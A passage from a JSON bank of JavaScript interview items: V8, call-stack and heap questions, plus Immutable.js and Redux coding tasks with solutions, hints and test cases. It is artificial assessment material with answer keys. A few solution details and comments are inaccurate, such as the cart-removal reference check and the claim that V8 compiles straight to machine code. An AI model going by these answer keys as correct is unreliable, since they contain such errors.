          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_engine_v8_mcq_1",
          "topic": "JavaScript Engine: V8",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is NOT a characteristic of the V8 JavaScript engine?",
          "answer": "It is primarily used for server-side Java applications.",
          "options": [
            "It is developed by Google.",
            "It is used in the Chrome browser.",
            "It is used in Node.js.",
            "It is primarily used for server-side Java applications."
          ],
          "analysisPoints": [
            "Tests basic knowledge about the V8 engine.",
            "Distinguishes V8's application domains (browser, Node.js) from unrelated technologies (Java)."
          ],
          "keyConcepts": [
            "JavaScript Engine",
            "V8",
            "Chrome",
            "Node.js"
          ],
          "evaluationCriteria": [
            "Correctly identifies the false statement about V8."
          ],
          "example": "V8 is a high-performance JavaScript engine written in C++ that powers Google Chrome and Node.js. It compiles JavaScript directly to native machine code before executing it, which is why it's so fast. It has no direct relation to Java applications.",
          "tags": [
            "JavaScript Engine",
            "V8",
            "Basic",
            "MCQ"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_js_engine_call_stack_open_1",
          "topic": "JavaScript Engine: Call Stack",
          "level": "medium",
          "type": "open",
          "question": "Describe the purpose and behavior of the Call Stack in a JavaScript engine. Explain what happens when a 'Stack Overflow' error occurs and why it's typically encountered.",
          "answer": null,
          "options": [],
          "analysisPoints": [
            "Defines Call Stack as a LIFO data structure.",
            "Explains how function calls add/remove frames.",
            "Clarifies JavaScript's single-threaded nature in relation to the Call Stack.",
            "Describes Stack Overflow cause (infinite recursion) and consequence (error)."
          ],
          "keyConcepts": [
            "Call Stack",
            "LIFO",
            "Stack Frame",
            "Execution Context",
            "Single-threaded JavaScript",
            "Stack Overflow",
            "Recursion"
          ],
          "evaluationCriteria": [
            "Accurate and comprehensive explanation of Call Stack mechanics.",
            "Clear explanation of Stack Overflow conditions and implications."
          ],
          "example": "### Predicted Answer Structure:\n\nThe **Call Stack** is a fundamental component of the JavaScript engine, acting as a Last-In, First-Out (LIFO) data structure. Its primary purpose is to keep track of the execution context of a program. It records where in the program we are, and what function is currently being executed.\n\n**Behavior:**\n1.  **Function Call**: When a function is called, a new 'stack frame' (also known as an 'execution context' or 'call frame') is created and pushed onto the top of the Call Stack. This frame contains information necessary for the function's execution, such as its arguments, local variables, and the point in the code where execution should return once the function completes.\n2.  **Function Execution**: The JavaScript engine executes the function whose frame is currently at the top of the stack.\n3.  **Function Return**: When a function finishes execution (either by reaching its `return` statement or the end of its body), its stack frame is popped off the stack, and execution resumes at the point where the function was called (which is now the new top of the stack).\n\nSince JavaScript is single-threaded, it means there's only one Call Stack. This implies that only one function can be executing at any given time. If a function takes a long time to execute, it 'blocks' the stack, preventing any other code (including UI updates or event handling) from running until it finishes.\n\n**Stack Overflow Error:**\n\nA 'Stack Overflow' error occurs when the Call Stack exceeds its maximum allowed size. This typically happens in scenarios involving **infinite recursion** without a proper base case, where a function calls itself repeatedly without ever reaching a condition that would stop the calls. Each recursive call pushes a new frame onto the stack, and if this process continues indefinitely, the stack eventually runs out of allocated memory space.\n\n**Example:**\n```javascript\nfunction infiniteRecursion() {\n  infiniteRecursion(); // This line keeps pushing new frames without popping\n}\ninfiniteRecursion();\n// This will eventually lead to: Uncaught RangeError: Maximum call stack size exceeded\n```\n\nWhen a Stack Overflow occurs, the JavaScript engine terminates the execution with an error, as it cannot allocate more memory for new stack frames.",
          "tags": [
            "JavaScript Engine",
            "Call Stack",
            "Stack Overflow",
            "Single-threaded",
            "Recursion",
            "Open-Ended"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_js_engine_heap_flashcard_1",
          "topic": "JavaScript Engine: Memory Heap",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary role of the Memory Heap in a JavaScript engine?",
          "answer": "The Memory Heap is the region of memory where objects, functions, and variables (that are not primitives and don't fit directly on the stack) are stored. It's a large, unstructured area for dynamic memory allocation.",
          "options": [],
          "analysisPoints": [
            "Tests recall of Memory Heap's purpose.",
            "Distinguishes Heap from Call Stack."
          ],
          "keyConcepts": [
            "Memory Heap",
            "Memory Allocation",
            "Objects",
            "Dynamic Memory"
          ],
          "evaluationCriteria": [
            "Accurate definition of Memory Heap's role."
          ],
          "example": null,
          "tags": [
            "JavaScript Engine",
            "Memory Heap",
            "Flashcard",
            "Easy"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 3,
          "interviewFrequency": 5,
          "learningPath": "beginner"
        },
        {
          "id": "question_js_engine_call_stack_code_1",
          "topic": "JavaScript Engine: Call Stack & Execution Order",
          "level": "medium",
          "type": "code",
          "question": "Consider the following JavaScript code:\n```javascript\nfunction first() {\n  console.log('1. Inside first()');\n  second();\n  console.log('3. Back in first()');\n}\n\nfunction second() {\n  console.log('2. Inside second()');\n  third();\n  console.log('5. Back in second()');\n}\n\nfunction third() {\n  console.log('4. Inside third()');\n}\n\nfirst();\nconsole.log('6. After first() call');\n```\nWithout running the code, predict the exact order of `console.log` outputs based on your understanding of the JavaScript Call Stack.",
          "answer": "```javascript\n/*\nPrediction:\n\n1. first() is called, pushed to stack.\n   Stack: [first]\n   Output: '1. Inside first()'\n\n2. second() is called from first(), pushed to stack.\n   Stack: [first, second]\n   Output: '2. Inside second()'\n\n3. third() is called from second(), pushed to stack.\n   Stack: [first, second, third]\n   Output: '4. Inside third()'\n\n4. third() completes, popped from stack.\n   Stack: [first, second]\n   Output: '5. Back in second()'\n\n5. second() completes, popped from stack.\n   Stack: [first]\n   Output: '3. Back in first()'\n\n6. first() completes, popped from stack.\n   Stack: []\n   Output: '6. After first() call'\n\nExpected output sequence:\n1. Inside first()\n2. Inside second()\n4. Inside third()\n5. Back in second()\n3. Back in first()\n6. After first() call\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Tests understanding of Call Stack LIFO principle.",
            "Tests ability to trace synchronous function execution flow.",
            "Requires careful attention to `console.log` placement relative to function calls and returns."
          ],
          "keyConcepts": [
            "Call Stack",
            "Execution Order",
            "LIFO",
            "Synchronous Code"
          ],
          "evaluationCriteria": [
            "Accurate prediction of output sequence.",
            "Demonstrates clear mental model of Call Stack behavior."
          ],
          "example": null,
          "tags": [
            "JavaScript Engine",
            "Call Stack",
            "Code Challenge",
            "Medium"
          ],
          "prerequisites": [
            "javascript_fundamentals"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_immutable_state_management",
          "title": "Implement an Immutable Shopping Cart Manager",
          "description": "\nImplement a set of functions to manage a shopping cart using `Immutable.js`. Your solution should demonstrate the core principles of immutability and efficient state updates.\n\n**Requirements:**\n1.  **Initial Cart State**: Define an initial empty shopping cart using `Immutable.Map` which should contain a `List` for `items` and a numerical `totalPrice` (initially 0).\n2.  **`addItemToCart(cart, item)`**: A pure function that takes an `Immutable.Map` `cart` and a plain JavaScript `item` object (`{ id: string, name: string, price: number, quantity: number }`). It should add the `item` to the `items` list in the cart. If the item already exists in the cart (same `id`), increase its `quantity` and update the `totalPrice` accordingly. Otherwise, add the new item.\n3.  **`removeItemFromCart(cart, itemId)`**: A pure function that takes an `Immutable.Map` `cart` and an `itemId` (string). It should remove the item with the given `itemId` from the `items` list and update `totalPrice`.\n4.  **`updateItemQuantity(cart, itemId, newQuantity)`**: A pure function that takes an `Immutable.Map` `cart`, an `itemId` (string), and `newQuantity` (number). It should update the quantity of the specified item and recalculate the `totalPrice`.\n5.  Ensure all functions return new `Immutable.Map` instances, leaving the original `cart` unchanged.\n6.  The `totalPrice` must always be accurately calculated based on the sum of `item.price * item.quantity` for all items in the cart.\n",
          "difficulty": "medium",
          "startingCode": "import { Map, List, fromJS } from 'immutable';\n\n// 1. Initial Cart State\nconst initialCartState = Map({\n  items: List(),\n  totalPrice: 0,\n});\n\n// Helper to calculate total price\nconst calculateTotalPrice = (items) => {\n  return items.reduce((sum, item) => sum + (item.get('price') * item.get('quantity')), 0);\n};\n\n/**\n * Adds an item to the cart or updates its quantity if already present.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {object} item The plain JS item to add/update: { id, name, price, quantity }\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction addItemToCart(cart, item) {\n  // TODO: Implement this function\n  return cart;\n}\n\n/**\n * Removes an item from the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to remove.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction removeItemFromCart(cart, itemId) {\n  // TODO: Implement this function\n  return cart;\n}\n\n/**\n * Updates the quantity of an item in the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to update.\n * @param {number} newQuantity The new quantity for the item.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction updateItemQuantity(cart, itemId, newQuantity) {\n  // TODO: Implement this function\n  return cart;\n}\n\n// Example Usage (for testing):\n// let currentCart = initialCartState;\n// console.log('Initial Cart:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\n// console.log('After adding Laptop:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p2', name: 'Mouse', price: 25, quantity: 2 });\n// console.log('After adding Mouse:', currentCart.toJS());\n\n// currentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 }); // Add existing item\n// console.log('After adding Laptop again:', currentCart.toJS());\n\n// currentCart = updateItemQuantity(currentCart, 'p2', 5);\n// console.log('After updating Mouse quantity:', currentCart.toJS());\n\n// currentCart = removeItemFromCart(currentCart, 'p1');\n// console.log('After removing Laptop:', currentCart.toJS());\n",
          "solutionCode": "import { Map, List, fromJS } from 'immutable';\n\n// 1. Initial Cart State\nconst initialCartState = Map({\n  items: List(),\n  totalPrice: 0,\n});\n\n// Helper to calculate total price\nconst calculateTotalPrice = (items) => {\n  return items.reduce((sum, item) => sum + (item.get('price') * item.get('quantity')), 0);\n};\n\n/**\n * Adds an item to the cart or updates its quantity if already present.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {object} item The plain JS item to add/update: { id, name, price, quantity }\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction addItemToCart(cart, item) {\n  const existingItemIndex = cart.get('items').findIndex(cartItem => cartItem.get('id') === item.id);\n\n  let newItems;\n  if (existingItemIndex !== -1) {\n    // Item exists, update quantity\n    newItems = cart.get('items').update(existingItemIndex, cartItem =>\n      cartItem.update('quantity', q => q + item.quantity)\n    );\n  } else {\n    // Item does not exist, add new item (convert to Immutable Map first)\n    newItems = cart.get('items').push(fromJS(item));\n  }\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n/**\n * Removes an item from the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to remove.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction removeItemFromCart(cart, itemId) {\n  const newItems = cart.get('items').filterNot(item => item.get('id') === itemId);\n\n  // If the list size hasn't changed, the item wasn't found, so return original cart\n  if (newItems.size === cart.get('items').size && newItems !== cart.get('items')) {\n      return cart; // No item removed, no state change\n  }\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n/**\n * Updates the quantity of an item in the cart.\n * @param {Immutable.Map} cart The current immutable cart state.\n * @param {string} itemId The ID of the item to update.\n * @param {number} newQuantity The new quantity for the item.\n * @returns {Immutable.Map} A new immutable cart state.\n */\nfunction updateItemQuantity(cart, itemId, newQuantity) {\n  if (newQuantity <= 0) {\n    return removeItemFromCart(cart, itemId); // Remove if quantity is 0 or less\n  }\n\n  const existingItemIndex = cart.get('items').findIndex(cartItem => cartItem.get('id') === itemId);\n\n  if (existingItemIndex === -1) {\n    return cart; // Item not found, return original cart\n  }\n\n  const newItems = cart.get('items').update(existingItemIndex, item =>\n    item.set('quantity', newQuantity)\n  );\n\n  return cart.set('items', newItems)\n             .set('totalPrice', calculateTotalPrice(newItems));\n}\n\n// --- Test Cases ---\nlet currentCart = initialCartState;\nconsole.log('Initial Cart:', currentCart.toJS()); // { items: [], totalPrice: 0 }\n\n// Test 1: Add first item\ncurrentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\nconsole.log('Test 1 (Add Laptop):', currentCart.toJS()); // { items: [{ id: 'p1', name: 'Laptop', price: 1200, quantity: 1 }], totalPrice: 1200 }\n\n// Test 2: Add second item\ncurrentCart = addItemToCart(currentCart, { id: 'p2', name: 'Mouse', price: 25, quantity: 2 });\nconsole.log('Test 2 (Add Mouse):', currentCart.toJS()); // { items: [..., { id: 'p2', name: 'Mouse', price: 25, quantity: 2 }], totalPrice: 1250 }\n\n// Test 3: Add existing item (Laptop) - quantity should increase\nconst originalCartBeforeDup = currentCart;\ncurrentCart = addItemToCart(currentCart, { id: 'p1', name: 'Laptop', price: 1200, quantity: 1 });\nconsole.log('Test 3 (Add Laptop again):', currentCart.toJS()); // { items: [{ id: 'p1', ..., quantity: 2 }, ...], totalPrice: 2450 }\nconsole.log('Original cart unchanged:', originalCartBeforeDup.toJS() === currentCart.toJS()); // Should be false\n\n// Test 4: Update quantity of an item\ncurrentCart = updateItemQuantity(currentCart, 'p2', 5);\nconsole.log('Test 4 (Update Mouse quantity to 5):', currentCart.toJS()); // { items: [..., { id: 'p2', ..., quantity: 5 }], totalPrice: 2525 }\n\n// Test 5: Remove an item\ncurrentCart = removeItemFromCart(currentCart, 'p1');\nconsole.log('Test 5 (Remove Laptop):', currentCart.toJS()); // { items: [{ id: 'p2', ..., quantity: 5 }], totalPrice: 125 }\n\n// Test 6: Try to remove non-existent item\nconst cartBeforeNonExistentRemoval = currentCart;\ncurrentCart = removeItemFromCart(currentCart, 'p99');\nconsole.log('Test 6 (Remove non-existent):', currentCart.toJS()); // Should be same as previous state\nconsole.log('Cart unchanged after non-existent removal:', cartBeforeNonExistentRemoval === currentCart); // Should be true\n\n// Test 7: Update quantity to 0 (should remove item)\ncurrentCart = updateItemQuantity(currentCart, 'p2', 0);\nconsole.log('Test 7 (Update Mouse quantity to 0):', currentCart.toJS()); // { items: [], totalPrice: 0 }\n\n// Test 8: Empty cart state\ncurrentCart = initialCartState;\nconsole.log('Test 8 (Reset to initial state):', currentCart.toJS()); // { items: [], totalPrice: 0 }\n",
          "testCases": [
            "Add first item: cart should contain one item with correct price and total.",
            "Add second item: cart should contain two distinct items with correct total.",
            "Add an existing item: quantity should be incremented, total price updated, original cart unchanged.",
            "Update item quantity: quantity should change, total price recalculated, original cart unchanged.",
            "Update item quantity to zero or less: item should be removed, total price updated.",
            "Remove an item: item should be gone, total price updated, original cart unchanged.",
            "Remove a non-existent item: cart should remain unchanged (referential equality should hold).",
            "Cart with multiple items, perform mixed operations (add, update, remove) in sequence, verify final state and total price."
          ],
          "hints": [
            "Remember to use `fromJS(item)` when adding a plain JavaScript object into an Immutable.js collection like `Immutable.List`.",
            "For updating an item's quantity in a list, `Immutable.List.prototype.update(index, updaterFn)` or `map` with a conditional update can be useful.",
            "The `findIndex` method on `Immutable.List` can help locate items by ID.",
            "Always return a *new* Immutable Map after any modification; do not mutate the original `cart` object passed to the function.",
            "The `calculateTotalPrice` helper should be called after any changes to the `items` list."
          ],
          "tags": [
            "Immutable.js",
            "State Management",
            "Data Structures",
            "Frontend",
            "Interview Task"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "immutable_js_collections"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "immutability",
            "functional_programming",
            "redux_state_management"
          ]
        },
        {
          "id": "task_redux_immutable_reducer",
          "title": "Build a Simple Feature Reducer with Immutable.js",
          "description": "\nImplement a Redux reducer for a 'Settings' feature. The state for this feature should be an `Immutable.Map` that stores user settings. You need to handle several actions, ensuring all state updates adhere to immutability using `Immutable.js`.\n\n**Initial State:**\n`Immutable.Map({ theme: 'light', notificationsEnabled: true, language: 'en' })`\n\n**Actions to Handle:**\n1.  **`SET_THEME`**: payload: `{ newTheme: 'dark' | 'light' | 'system' }`. Updates the `theme` setting.\n2.  **`TOGGLE_NOTIFICATIONS`**: No payload. Toggles the `notificationsEnabled` boolean setting.\n3.  **`CHANGE_LANGUAGE`**: payload: `{ newLang: 'es' | 'fr' | 'en' }`. Updates the `language` setting.\n4.  **`RESET_SETTINGS`**: No payload. Resets the entire settings state back to the `initialState`.\n5.  **`UPDATE_MULTIPLE_SETTINGS`**: payload: `{ theme?: string, notificationsEnabled?: boolean, language?: string }`. Merges the provided partial settings object into the current state. This payload might be a plain JS object.\n\nYour reducer must return a new `Immutable.Map` for every valid state change. Default to the current state for unhandled actions.\n",
          "difficulty": "medium",
          "startingCode": "import { Map, fromJS } from 'immutable';\n\nconst initialSettingsState = Map({\n  theme: 'light',\n  notificationsEnabled: true,\n  language: 'en'\n});\n\nfunction settingsReducer(state = initialSettingsState, action) {\n  switch (action.type) {\n    case 'SET_THEME':\n      // TODO: Implement theme update\n      return state;\n    case 'TOGGLE_NOTIFICATIONS':\n      // TODO: Implement notification toggle\n      return state;\n    case 'CHANGE_LANGUAGE':\n      // TODO: Implement language change\n      return state;\n    case 'RESET_SETTINGS':\n      // TODO: Implement reset\n      return state;\n    case 'UPDATE_MULTIPLE_SETTINGS':\n      // TODO: Implement merging multiple settings\n      return state;\n    default:\n      return state;\n  }\n}\n\n// Example Usage (for testing):\n// let currentSettings = settingsReducer(undefined, { type: '@@INIT' }); // Simulate Redux init\n// console.log('Initial settings:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'SET_THEME', payload: { newTheme: 'dark' } });\n// console.log('After SET_THEME to dark:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'TOGGLE_NOTIFICATIONS' });\n// console.log('After TOGGLE_NOTIFICATIONS:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'CHANGE_LANGUAGE', payload: { newLang: 'es' } });\n// console.log('After CHANGE_LANGUAGE to es:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'UPDATE_MULTIPLE_SETTINGS', payload: { theme: 'system', language: 'fr' } });\n// console.log('After UPDATE_MULTIPLE_SETTINGS:', currentSettings.toJS());\n\n// currentSettings = settingsReducer(currentSettings, { type: 'RESET_SETTINGS' });\n// console.log('After RESET_SETTINGS:', currentSettings.toJS());\n",
          "solutionCode": "import { Map, fromJS } from 'immutable';\n\nconst initialSettingsState = Map({\n  theme: 'light',\n  notificationsEnabled: true,\n  language: 'en'\n});\n\nfunction settingsReducer(state = initialSettingsState, action) {\n  switch (action.type) {\n    case 'SET_THEME':\n      return state.set('theme', action.payload.newTheme);\n    case 'TOGGLE_NOTIFICATIONS':\n      return state.update('notificationsEnabled', enabled => !enabled);\n    case 'CHANGE_LANGUAGE':\n      return state.set('language', action.payload.newLang);\n    case 'RESET_SETTINGS':\n      // Return a *new* instance of the initial state, not the same reference\n      return initialSettingsState;\n    case 'UPDATE_MULTIPLE_SETTINGS':\n      // Merge assumes action.payload can be directly merged. \n      // If it's a plain JS object, fromJS will convert it to Immutable for merging.\n      return state.merge(action.payload);\n    default:\n      return state;\n  }\n}\n\n// --- Test Cases ---\nlet currentSettings = settingsReducer(undefined, { type: '@@INIT' }); // Simulate Redux init\nconsole.log('Initial settings:', currentSettings.toJS());\n// Expected: { theme: 'light', notificationsEnabled: true, language: 'en' }\n\nconst state1 = settingsReducer(currentSettings, { type: 'SET_THEME', payload: { newTheme: 'dark' } });\nconsole.log('After SET_THEME to dark:', state1.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: true, language: 'en' }\nconsole.log('Original state unchanged (state1 !== currentSettings):', state1 !== currentSettings); // true\n\nconst state2 = settingsReducer(state1, { type: 'TOGGLE_NOTIFICATIONS' });\nconsole.log('After TOGGLE_NOTIFICATIONS:', state2.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: false, language: 'en' }\nconsole.log('Original state unchanged (state2 !== state1):', state2 !== state1); // true\n\nconst state3 = settingsReducer(state2, { type: 'CHANGE_LANGUAGE', payload: { newLang: 'es' } });\nconsole.log('After CHANGE_LANGUAGE to es:', state3.toJS());\n// Expected: { theme: 'dark', notificationsEnabled: false, language: 'es' }\nconsole.log('Original state unchanged (state3 !== state2):', state3 !== state2); // true\n\nconst state4 = settingsReducer(state3, { type: 'UPDATE_MULTIPLE_SETTINGS', payload: { theme: 'system', language: 'fr' } });\nconsole.log('After UPDATE_MULTIPLE_SETTINGS:', state4.toJS());\n// Expected: { theme: 'system', notificationsEnabled: false, language: 'fr' }\nconsole.log('Original state unchanged (state4 !== state3):', state4 !== state3); // true\n\nconst state5 = settingsReducer(state4, { type: 'RESET_SETTINGS' });\nconsole.log('After RESET_SETTINGS:', state5.toJS());\n// Expected: { theme: 'light', notificationsEnabled: true, language: 'en' }\nconsole.log('Original state unchanged (state5 !== state4):', state5 !== state4); // true\nconsole.log('Reset state is new instance of initial:', state5 === initialSettingsState); // true (since initialSettingsState is a Map literal, its reference is consistent if not modified)\n\nconst state6 = settingsReducer(state5, { type: 'UNKNOWN_ACTION' });\nconsole.log('After UNKNOWN_ACTION:', state6.toJS());\n// Expected: Same as state5\nconsole.log('State unchanged (state6 === state5):', state6 === state5); // true (for default case, return same reference)\n",
          "testCases": [
            "Initial state should be correctly set.",
            "SET_THEME: updates 'theme' property, returns new state.",
            "TOGGLE_NOTIFICATIONS: flips 'notificationsEnabled', returns new state.",
            "CHANGE_LANGUAGE: updates 'language' property, returns new state.",
            "RESET_SETTINGS: returns the original `initialSettingsState` Map.",
            "UPDATE_MULTIPLE_SETTINGS: correctly merges partial data, handles plain JS payload (if `merge` is used correctly with `fromJS` or plain objects that get converted internally by merge).",
            "Unhandled action: returns the exact same state reference.",
            "Verify immutability: Ensure `oldState !== newState` for all modifying actions, and `oldState === newState` for unhandled actions."
          ],
          "hints": [
            "For `SET_THEME` and `CHANGE_LANGUAGE`, the `set` method on `Immutable.Map` is appropriate.",
            "For `TOGGLE_NOTIFICATIONS`, consider using the `update` method to apply a function to the current boolean value.",
            "For `RESET_SETTINGS`, simply return the `initialSettingsState` constant.",
            "For `UPDATE_MULTIPLE_SETTINGS`, the `merge` method of `Immutable.Map` is designed for this purpose. It can take a plain JavaScript object as an argument and will convert it internally.",
            "Remember that all Immutable.js methods like `set`, `update`, `merge` return *new* Immutable instances. Your reducer should always return this new instance."
          ],
          "tags": [
            "Redux",
            "Immutable.js",
            "Reducer",
            "State Management",
            "Interview Task"
          ],
          "timeEstimate": 40,
          "prerequisites": [
            "redux_with_immutable_js"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "immutability",
            "pure_functions",
            "functional_programming"
          ]
        },
        {
          "id": "task_redux_selectors_implementation",
          "title": "Implement Redux Selectors for a Blog Post Application",
          "description": "\nFor a Redux application managing blog posts and users, implement several selectors using `Immutable.js` and optionally `reselect` (if you want to demonstrate memoization).\n\n**Given Immutable.js State Structure:**\n```javascript\nimport { Map, List } from 'immutable';\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n```\n\n**Selectors to Implement:**\n1.  **`getAllPosts`**: A basic selector that returns the `List` of all posts.\n2.  **`getUsers`**: A basic selector that returns the `Map` of all users.\n3.  **`getPublishedPosts`**: A derived selector that filters `getAllPosts` to return only posts where `published` is `true`.\n4.  **`getPostsByAuthor(state, authorId)`**: A derived selector that takes the state and an `authorId` as arguments, returning posts written by that author.\n5.  **`getPostWithAuthorName`**: A derived selector that returns a list of posts, but each post object should include an additional `authorName` property (e.g., `{ id: 'post1', title: '...', authorId: 'userA', authorName: 'Alice', ...}`).\n6.  **`getPopularPublishedPosts`**: A derived selector that returns published posts with `views` greater than or equal to 100, sorted by `views` in descending order.\n\nAll selectors should return Immutable.js structures unless specifically stated (e.g., `toJS()` is optional for viewing, but selectors should aim to return Immutable for performance).\n",
          "difficulty": "hard",
          "startingCode": "import { Map, List } from 'immutable';\nimport { createSelector } from 'reselect'; // Optional, but good practice for derived selectors\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n\n// 1. getAllPosts\nconst getAllPosts = state => { /* TODO */ return state.get('posts'); };\n\n// 2. getUsers\nconst getUsers = state => { /* TODO */ return state.get('users'); };\n\n// 3. getPublishedPosts\n// const getPublishedPosts = createSelector(\n//   [getAllPosts],\n//   (posts) => { /* TODO */ return posts; }\n// );\n\n// 4. getPostsByAuthor\n// const getPostsByAuthor = createSelector(\n//   [getAllPosts, (state, authorId) => authorId], // Second argument is the authorId\n//   (posts, authorId) => { /* TODO */ return posts; }\n// );\n\n// 5. getPostWithAuthorName\n// const getPostWithAuthorName = createSelector(\n//   [getAllPosts, getUsers],\n//   (posts, users) => { /* TODO */ return posts; }\n// );\n\n// 6. getPopularPublishedPosts\n// const getPopularPublishedPosts = createSelector(\n//   [getPublishedPosts],\n//   (publishedPosts) => { /* TODO */ return publishedPosts; }\n// );\n\n// Example Usage (for testing):\n// console.log('All Posts:', getAllPosts(blogAppState).toJS());\n// console.log('Published Posts:', getPublishedPosts(blogAppState).toJS());\n// console.log('Posts by Alice:', getPostsByAuthor(blogAppState, 'userA').toJS());\n// console.log('Posts with Author Name:', getPostWithAuthorName(blogAppState).toJS());\n// console.log('Popular Published Posts:', getPopularPublishedPosts(blogAppState).toJS());\n",
          "solutionCode": "import { Map, List } from 'immutable';\nimport { createSelector } from 'reselect';\n\nconst blogAppState = Map({\n  posts: List([\n    Map({ id: 'post1', title: 'Intro to Redux', authorId: 'userA', tags: List(['redux', 'js']), published: true, views: 150 }),\n    Map({ id: 'post2', title: 'Understanding Immutable.js', authorId: 'userB', tags: List(['immutablejs', 'js']), published: true, views: 200 }),\n    Map({ id: 'post3', title: 'Advanced React Hooks', authorId: 'userA', tags: List(['react', 'hooks']), published: false, views: 50 }),\n    Map({ id: 'post4', title: 'Node.js Performance', authorId: 'userC', tags: List(['nodejs', 'backend']), published: true, views: 100 })\n  ]),\n  users: Map({\n    'userA': Map({ id: 'userA', name: 'Alice', role: 'admin' }),\n    'userB': Map({ id: 'userB', name: 'Bob', role: 'editor' }),\n    'userC': Map({ id: 'userC', name: 'Charlie', role: 'viewer' })\n  }),\n  filters: Map({\n    showPublishedOnly: true,\n    searchQuery: ''\n  })\n});\n\n// 1. getAllPosts\nconst getAllPosts = state => state.get('posts');\n\n// 2. getUsers\nconst getUsers = state => state.get('users');\n\n// 3. getPublishedPosts (using createSelector for memoization)\nconst getPublishedPosts = createSelector(\n  [getAllPosts],\n  (posts) => posts.filter(post => post.get('published'))\n);\n\n// 4. getPostsByAuthor (takes an additional argument)\nconst getPostsByAuthor = createSelector(\n  [getAllPosts, (state, authorId) => authorId], // Second input selector gets the argument\n  (posts, authorId) => posts.filter(post => post.get('authorId') === authorId)\n);\n\n// 5. getPostWithAuthorName\nconst getPostWithAuthorName = createSelector(\n  [getAllPosts, getUsers],\n  (posts, users) => {\n    return posts.map(post => {\n      const author = users.get(post.get('authorId'));\n      return post.set('authorName', author ? author.get('name') : 'Unknown');\n    });\n  }\n);\n\n// 6. getPopularPublishedPosts\nconst getPopularPublishedPosts = createSelector(\n  [getPublishedPosts], // Uses the previously defined selector\n  (publishedPosts) => {\n    return publishedPosts\n      .filter(post => post.get('views') >= 100)\n      .sortBy(post => -post.get('views')); // Sort descending by views\n  }\n);\n\n// --- Test Cases ---\nconsole.log('--- Selector Test Results ---');\n\nconsole.log('\\n1. All Posts:');\nconsole.log(getAllPosts(blogAppState).toJS());\n// Expected: List of 4 posts\n\nconsole.log('\\n2. Users:');\nconsole.log(getUsers(blogAppState).toJS());\n// Expected: Map of 3 users\n\nconsole.log('\\n3. Published Posts:');\nconsole.log(getPublishedPosts(blogAppState).toJS());\n// Expected: 3 posts (post1, post2, 